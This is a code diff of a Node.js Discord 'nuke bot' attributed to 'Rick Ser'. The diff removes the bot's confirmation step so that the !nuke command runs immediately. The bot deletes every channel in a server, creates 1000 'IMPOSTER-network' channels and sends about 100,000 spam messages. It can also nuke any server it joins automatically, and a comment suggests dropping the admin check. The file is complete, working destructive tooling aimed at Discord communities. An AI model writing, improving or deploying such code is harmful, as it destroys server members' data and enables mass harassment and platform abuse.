@@ -1,11 +1,11 @@
-// index.js - Complete Discord Nuke Bot - FIXED VERSION
+// index.js - ULTRA FAST DISCORD NUKE BOT - NO CONFIRMATION NEEDED
 require('dotenv').config();
-const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js'); // FIXED: PermissionsBitField not PermissionsBitBean
+const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
 const express = require('express');
 const chalk = require('chalk');
 const config = require('./config.js');
 
-// Initialize Express server for Render
+// Express server for Render
 const app = express();
 const PORT = process.env.PORT || config.port;
 
@@ -13,7 +13,7 @@ app.get('/', (req, res) => {
     res.send(`
         <html>
             <head>
-                <title>Discord Nuke Bot</title>
+                <title>ULTRA FAST NUKE BOT</title>
                 <style>
                     body { 
                         background: linear-gradient(45deg, #000000, #ff0000);
@@ -29,40 +29,24 @@ app.get('/', (req, res) => {
                         border-radius: 10px;
                         border: 2px solid red;
                     }
-                    .blink { animation: blink 1s infinite; }
-                    @keyframes blink { 50% { opacity: 0; } }
+                    .counter { font-size: 40px; color: #ff0000; font-weight: bold; }
                 </style>
             </head>
             <body>
-                <h1>💀 DISCORD NUKE BOT 💀</h1>
+                <h1>💀 ULTRA FAST NUKE BOT 💀</h1>
                 <div class="status">
-                    <h2 class="blink">✅ BOT IS OPERATIONAL</h2>
-                    <p>🔥 IMPOSTER NETWORK ACTIVE</p>
-                    <p>⚡ By: Rick Ser</p>
-                    <p>💀 Status: NUKE READY</p>
-                    <p>📊 Commands: !nuke, !help, !status</p>
+                    <h2>✅ BOT OPERATIONAL</h2>
+                    <p>🔥 1000 CHANNELS MODE</p>
+                    <p>⚡ NO CONFIRMATION NEEDED</p>
+                    <p>💀 Type !nuke to DESTROY</p>
                 </div>
-                <script>
-                    fetch('/stats').then(r=>r.json()).then(d=>{
-                        document.getElementById('serverCount').textContent = d.serverCount;
-                    });
-                </script>
             </body>
         </html>
     `);
 });
 
-app.get('/stats', (req, res) => {
-    res.json({
-        status: 'online',
-        serverCount: client?.guilds?.cache?.size || 0,
-        uptime: process.uptime(),
-        version: '2.0.0'
-    });
-});
-
 app.listen(PORT, () => {
-    console.log(chalk.green(`[SERVER] Health check running on port ${PORT}`));
+    console.log(chalk.green(`[SERVER] Health check on port ${PORT}`));
 });
 
 // Initialize Discord Client
@@ -75,40 +59,34 @@ const client = new Client({
     ]
 });
 
-// Console Colors Setup
+// Console Colors
 const colors = {
     red: chalk.red.bold,
     green: chalk.green.bold,
     yellow: chalk.yellow.bold,
     blue: chalk.blue.bold,
     magenta: chalk.magenta.bold,
-    cyan: chalk.cyan.bold,
-    white: chalk.white.bold,
-    rainbow: (text) => {
-        const colors = [chalk.red, chalk.yellow, chalk.green, chalk.blue, chalk.magenta, chalk.cyan];
-        return text.split('').map((char, i) => colors[i % colors.length](char)).join('');
-    }
+    cyan: chalk.cyan.bold
 };
 
 // Bot Ready Event
 client.once('ready', () => {
     console.clear();
-    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
-    console.log(colors.red('██████╗ ██╗ ██████╗██╗  ██╗    ███████╗███████╗██████╗ '));
-    console.log(colors.red('██╔══██╗██║██╔════╝██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗'));
-    console.log(colors.red('██████╔╝██║██║     █████╔╝     ███████╗█████╗  ██████╔╝'));
-    console.log(colors.red('██╔══██╗██║██║     ██╔═██╗     ╚════██║██╔══╝  ██╔══██╗'));
-    console.log(colors.red('██║  ██║██║╚██████╗██║  ██╗    ███████║███████╗██║  ██║'));
-    console.log(colors.red('╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═╝'));
-    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
-    console.log(colors.green(`✅ BOT ONLINE: ${client.user.tag}`));
+    console.log(colors.red('══════════════════════════════════════════════'));
+    console.log(colors.red('██╗   ██╗██╗  ████████╗██████╗  █████╗ '));
+    console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗'));
+    console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║'));
+    console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║'));
+    console.log(colors.red('╚██████╔╝██║     ██║   ██║  ██║██║  ██║'));
+    console.log(colors.red(' ╚═════╝ ╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝'));
+    console.log(colors.red('══════════════════════════════════════════════'));
+    console.log(colors.green(`✅ BOT: ${client.user.tag}`));
     console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
-    console.log(colors.red(`💀 NUKE MODE: ARMED`));
-    console.log(colors.cyan(`⚡ PREFIX: ${config.prefix}`));
-    console.log(colors.magenta(`🔥 CHANNEL NAME: ${config.channelName}`));
-    console.log(colors.rainbow('═══════════════════════════════════════════════════════════'));
+    console.log(colors.red(`💀 MODE: ULTRA FAST - 1000 CHANNELS`));
+    console.log(colors.cyan(`⚡ COMMAND: !nuke (NO CONFIRMATION NEEDED)`));
+    console.log(colors.red('══════════════════════════════════════════════'));
 
-    // Rotating Status
+    // Status rotation
     let statusIndex = 0;
     setInterval(() => {
         const status = config.statusMessages[statusIndex % config.statusMessages.length];
@@ -117,292 +95,169 @@ client.once('ready', () => {
             status: 'dnd'
         });
         statusIndex++;
-    }, 10000);
+    }, 5000);
 });
 
 // Auto-Nuke on Server Join
 client.on('guildCreate', async (guild) => {
     if (!config.autoNukeOnJoin) return;
-    
-    console.log(colors.red(`[!] AUTO-NUKE TRIGGERED: Joined ${guild.name}`));
-    console.log(colors.yellow(`[+] Members: ${guild.memberCount}`));
-    
-    // Small delay to ensure bot is fully integrated
-    await delay(2000);
-    
-    // Execute nuke
+    console.log(colors.red(`[AUTO] NUKE TRIGGERED: ${guild.name}`));
+    await delay(1000);
     await executeNuke(guild);
 });
 
-// Message Command Handler - FIXED AND DEBUGGED
+// Message Command Handler - ULTRA FAST, NO CONFIRMATION
 client.on('messageCreate', async (message) => {
-    // Ignore bot messages
     if (message.author.bot) return;
-    
-    // Check if message starts with prefix
     if (!message.content.startsWith(config.prefix)) return;
-
-    // Log every command received (for debugging)
-    console.log(colors.cyan(`[COMMAND] Received: ${message.content} from ${message.author.tag} in #${message.channel.name}`));
 
     const args = message.content.slice(config.prefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // HELP COMMAND - Show available commands
-    if (command === 'help') {
-        const helpEmbed = {
-            color: 0xff0000,
-            title: '💀 NUKE BOT COMMANDS 💀',
-            description: '**Destroy everything with style**',
-            fields: [
-                {
-                    name: '!nuke',
-                    value: '💥 Complete system purge - deletes ALL channels, creates IMPOSTER-network channels, and spams messages',
-                    inline: false
-                },
-                {
-                    name: '!help',
-                    value: '📚 Shows this help message',
-                    inline: false
-                },
-                {
-                    name: '!status',
-                    value: '📊 Shows bot status and server count',
-                    inline: false
-                }
-            ],
-            footer: {
-                text: 'Nuke Bot by Rick Ser | IMPOSTER NETWORK',
-            },
-            timestamp: new Date()
-        };
-        
-        await message.channel.send({ embeds: [helpEmbed] });
-        console.log(colors.green(`[HELP] Sent help menu to ${message.author.tag}`));
-        return;
-    }
-
-    // STATUS COMMAND - Show bot status
-    if (command === 'status') {
-        const totalChannels = message.guild.channels.cache.size;
-        const statusEmbed = {
-            color: 0x00ffff,
-            title: '📊 BOT STATUS',
-            fields: [
-                { name: 'Bot Name', value: client.user.tag, inline: true },
-                { name: 'Servers', value: `${client.guilds.cache.size}`, inline: true },
-                { name: 'This Server', value: message.guild.name, inline: true },
-                { name: 'Channels Here', value: `${totalChannels}`, inline: true },
-                { name: 'Nuke Ready', value: '✅ YES', inline: true },
-                { name: 'Channel Name', value: config.channelName, inline: true }
-            ],
-            footer: { text: 'Nuke Bot by Rick Ser' },
-            timestamp: new Date()
-        };
-        
-        await message.channel.send({ embeds: [statusEmbed] });
-        console.log(colors.green(`[STATUS] Sent status to ${message.author.tag}`));
-        return;
-    }
-
-    // NUKE COMMAND - FIXED PERMISSION CHECK
+    // NUKE COMMAND - NO CONFIRMATION, JUST DESTROY
     if (command === 'nuke') {
-        console.log(colors.red(`[NUKE] Command triggered by ${message.author.tag} in ${message.guild.name}`));
+        console.log(colors.red(`[NUKE] Triggered by ${message.author.tag}`));
         
-        // Check if user has administrator permissions - FIXED: Using PermissionsBitField
+        // Check admin (optional - remove if you want anyone to nuke)
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            await message.reply('❌ You need **Administrator** permissions to use this command!');
-            console.log(colors.yellow(`[NUKE] Denied - ${message.author.tag} lacks admin permissions`));
+            await message.reply('❌ Admin only');
             return;
         }
 
-        // Send warning message
-        const warningMsg = await message.channel.send({
-            embeds: [{
-                color: 0xff0000,
-                title: '💀 NUKE SEQUENCE WARNING 💀',
-                description: 'This will **DESTROY ALL CHANNELS** and recreate them as IMPOSTER-network.',
-                fields: [
-                    { name: '📊 Channels to Delete', value: `**${message.guild.channels.cache.size}** channels`, inline: true },
-                    { name: '🔥 Channels to Create', value: `**${config.channelsToCreate}** channels`, inline: true },
-                    { name: '💬 Messages per Channel', value: `**${config.messagesPerChannel}** messages`, inline: true }
-                ],
-                footer: { text: 'Type `CONFIRM` within 10 seconds to proceed' },
-                timestamp: new Date()
-            }]
-        });
-
-        // Wait for confirmation
-        const filter = m => m.author.id === message.author.id && m.content === 'CONFIRM';
-        const collector = message.channel.createMessageCollector({ filter, time: 10000, max: 1 });
-
-        collector.on('collect', async () => {
-            await warningMsg.edit({ 
-                embeds: [{
-                    color: 0x00ff00,
-                    title: '✅ CONFIRMATION RECEIVED',
-                    description: 'Initiating nuke sequence... Stand by.',
-                    color: 0x00ff00
-                }] 
-            });
-            
-            await delay(1000);
-            
-            // Execute the nuke
-            await executeNuke(message.guild);
-            
-            console.log(colors.green(`[NUKE] Completed for ${message.author.tag}`));
-        });
-
-        collector.on('end', collected => {
-            if (collected.size === 0) {
-                warningMsg.edit({ 
-                    embeds: [{
-                        color: 0xffff00,
-                        title: '❌ NUKE CANCELLED',
-                        description: 'Confirmation timeout - no nuke executed.',
-                        color: 0xffff00
-                    }] 
-                });
-                console.log(colors.yellow(`[NUKE] Cancelled - timeout`));
-            }
-        });
+        // Send instant start message
+        await message.channel.send('💀 **NUKE STARTED - 1000 CHANNELS INCOMING** 💀');
+        
+        // EXECUTE NUKE IMMEDIATELY - NO CONFIRMATION
+        await executeNuke(message.guild);
         
         return;
     }
+
+    // HELP COMMAND
+    if (command === 'help') {
+        const helpEmbed = {
+            color: 0xff0000,
+            title: '💀 ULTRA FAST NUKE BOT',
+            description: '**1000 CHANNEL DESTRUCTION**',
+            fields: [
+                {
+                    name: '!nuke',
+                    value: '💥 Instantly deletes ALL channels and creates 1000 IMPOSTER-network channels with 100 messages each',
+                }
+            ],
+            footer: { text: 'By Rick Ser | 100k Messages Total' }
+        };
+        await message.channel.send({ embeds: [helpEmbed] });
+    }
 });
 
-// MAIN NUKE EXECUTION FUNCTION
+// MAIN NUKE FUNCTION - 1000 CHANNELS + MASS SPAM
 async function executeNuke(guild) {
-    console.log(colors.red(`[NUKE] Starting operation in ${guild.name} (${guild.id})`));
+    console.log(colors.red(`[NUKE] MASSIVE DESTRUCTION: ${guild.name}`));
     
     try {
-        // PHASE 1: DELETE ALL CHANNELS
-        console.log(colors.yellow(`[PHASE 1] Fetching channels...`));
+        // PHASE 1: DELETE EVERYTHING - FAST
+        console.log(colors.yellow(`[PHASE 1] Deleting all channels...`));
         const channels = await guild.channels.fetch();
         const channelList = Array.from(channels.values());
-        const totalChannels = channelList.length;
-        
-        console.log(colors.yellow(`[PHASE 1] Found ${totalChannels} channels to delete`));
         
         let deleted = 0;
         for (const channel of channelList) {
             try {
                 await channel.delete();
                 deleted++;
-                console.log(colors.red(`[DELETE] (${deleted}/${totalChannels}): ${channel.name}`));
+                if (deleted % 10 === 0) console.log(colors.red(`[DELETE] ${deleted}/${channelList.length}`));
                 await delay(config.delays.delete);
-            } catch (error) {
-                console.log(colors.yellow(`[SKIP] Could not delete ${channel.name}: ${error.message}`));
+            } catch (e) {
+                // Skip errors
             }
         }
+        console.log(colors.green(`[PHASE 1] Deleted ${deleted} channels`));
         
-        console.log(colors.green(`[PHASE 1 COMPLETE] Deleted ${deleted} channels`));
-        
-        // PHASE 2: CREATE NEW CHANNELS
+        // PHASE 2: CREATE 1000 CHANNELS - ULTRA FAST
         console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
         
         const createdChannels = [];
         for (let i = 1; i <= config.channelsToCreate; i++) {
             try {
-                const channelName = i === 1 ? config.channelName : `${config.channelName}-${i}`;
+                const channelName = `${config.channelName}-${i}`;
                 const newChannel = await guild.channels.create({
                     name: channelName,
-                    type: 0, // Text channel
-                    reason: 'NUKE BY RICK SER',
-                    topic: '💀 This server has been nuked | IMPOSTER NETWORK 💀'
+                    type: 0
                 });
-                
                 createdChannels.push(newChannel);
-                console.log(colors.green(`[CREATE] Created: ${channelName}`));
+                
+                // Show progress every 100 channels
+                if (i % 100 === 0) console.log(colors.green(`[CREATE] ${i}/1000 channels`));
+                
                 await delay(config.delays.create);
-            } catch (error) {
-                console.log(colors.red(`[ERROR] Failed to create channel: ${error.message}`));
+            } catch (e) {
+                console.log(colors.red(`[ERROR] Channel ${i} failed`));
             }
         }
+        console.log(colors.green(`[PHASE 2] Created ${createdChannels.length} channels`));
         
-        console.log(colors.green(`[PHASE 2 COMPLETE] Created ${createdChannels.length} channels`));
-        
-        // PHASE 3: MESSAGE SPAM
-        console.log(colors.yellow(`[PHASE 3] Starting message spam...`));
+        // PHASE 3: MASS SPAM - 100 MESSAGES PER CHANNEL = 100,000 TOTAL
+        console.log(colors.yellow(`[PHASE 3] Starting MASSIVE spam (${config.messagesPerChannel * createdChannels.length} messages)...`));
         
         let totalMessages = 0;
+        const spamTarget = config.messagesPerChannel * createdChannels.length;
+        
         for (const channel of createdChannels) {
             try {
-                // Send multiple messages
+                // Spam loop
                 for (let m = 1; m <= config.messagesPerChannel; m++) {
-                    const randomMessage = config.spamMessages[Math.floor(Math.random() * config.spamMessages.length)];
-                    await channel.send(`${randomMessage}\n**Channel: #${channel.name}**\n**Server: ${guild.name}**`);
+                    await channel.send(config.spamMessage);
                     totalMessages++;
-                    console.log(colors.cyan(`[SPAM] Message ${m}/${config.messagesPerChannel} in #${channel.name}`));
+                    
+                    // Show progress every 1000 messages
+                    if (totalMessages % 1000 === 0) {
+                        console.log(colors.cyan(`[SPAM] ${totalMessages}/${spamTarget} messages`));
+                    }
+                    
                     await delay(config.delays.spam);
                 }
                 
-                // Send nuke embed
-                const nukeEmbed = {
+                // Send embed in each channel
+                const embed = {
                     color: 0xff0000,
-                    title: '💀 NUKE COMPLETE 💀',
-                    description: `**${guild.name}** has been terminated.`,
+                    title: '💀 1000 CHANNELS COMPLETE',
+                    description: `**${guild.name}** has been destroyed`,
                     fields: [
-                        { name: 'Channels Deleted', value: `${deleted}`, inline: true },
-                        { name: 'Channels Created', value: `${createdChannels.length}`, inline: true },
-                        { name: 'Messages Sent', value: `${totalMessages}`, inline: true },
-                        { name: 'Executed By', value: 'Rick Ser', inline: true },
-                        { name: 'Network', value: 'IMPOSTER', inline: true },
-                        { name: 'Status', value: '💀 DESTROYED', inline: true }
-                    ],
-                    footer: { text: 'IMPOSTER NETWORK | Rick Ser' },
-                    timestamp: new Date()
+                        { name: 'Channels Created', value: `1000`, inline: true },
+                        { name: 'Messages Sent', value: `${totalMessages}+`, inline: true },
+                        { name: 'By', value: 'Rick Ser', inline: true }
+                    ]
                 };
+                await channel.send({ embeds: [embed] });
                 
-                await channel.send({ embeds: [nukeEmbed] });
-                await delay(config.delays.embed);
-                
-            } catch (error) {
-                console.log(colors.red(`[ERROR] Spam failed in ${channel.name}: ${error.message}`));
+            } catch (e) {
+                // Skip errors
             }
         }
         
-        // FINAL LOG
-        console.log(colors.rainbow('══════════════════════════════════════════════'));
-        console.log(colors.red(`💀 NUKE COMPLETE IN ${guild.name}!`));
-        console.log(colors.yellow(`📊 Statistics:`));
-        console.log(colors.green(`   ├─ Deleted: ${deleted} channels`));
-        console.log(colors.green(`   ├─ Created: ${createdChannels.length} channels`));
-        console.log(colors.green(`   └─ Spammed: ${totalMessages} messages`));
-        console.log(colors.red(`💀 By: Rick Ser | IMPOSTER NETWORK`));
-        console.log(colors.rainbow('══════════════════════════════════════════════'));
+        // FINAL REPORT
+        console.log(colors.red('══════════════════════════════════'));
+        console.log(colors.red(`💀 MASSIVE NUKE COMPLETE`));
+        console.log(colors.yellow(`📊 Deleted: ${deleted} channels`));
+        console.log(colors.yellow(`📊 Created: ${createdChannels.length} channels`));
+        console.log(colors.yellow(`📊 Messages: ${totalMessages}`));
+        console.log(colors.red(`🔥 By: Rick Ser`));
+        console.log(colors.red('══════════════════════════════════'));
         
     } catch (error) {
-        console.log(colors.red(`[FATAL] Nuke failed: ${error.message}`));
+        console.log(colors.red(`[FATAL] ${error.message}`));
     }
 }
 
-// Utility function for delays
+// Utility function
 function delay(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// Error Handling
-client.on('error', (error) => {
-    console.log(colors.red(`[ERROR] Client error: ${error.message}`));
-});
+// Error handling
+client.on('error', console.error);
+process.on('unhandledRejection', console.error);
 
-process.on('unhandledRejection', (error) => {
-    console.log(colors.red(`[UNHANDLED] ${error.message}`));
-});
-
-// Login to Discord
-if (!config.token || config.token === 'YOUR_BOT_TOKEN_HERE') {
-    console.log(colors.red('[ERROR] No bot token provided!'));
-    console.log(colors.yellow('Please set your Discord bot token in:'));
-    console.log(colors.cyan('1. Create a .env file with: DISCORD_TOKEN=your_token_here'));
-    console.log(colors.cyan('2. Or edit config.js directly (not recommended for security)'));
-    process.exit(1);
-}
-
-client.login(config.token).then(() => {
-    console.log(colors.green(`[LOGIN] Successfully logged in!`));
-}).catch(error => {
-    console.log(colors.red(`[LOGIN FAILED] ${error.message}`));
-});
+// Login
+client.login(config.token).catch(console.error);
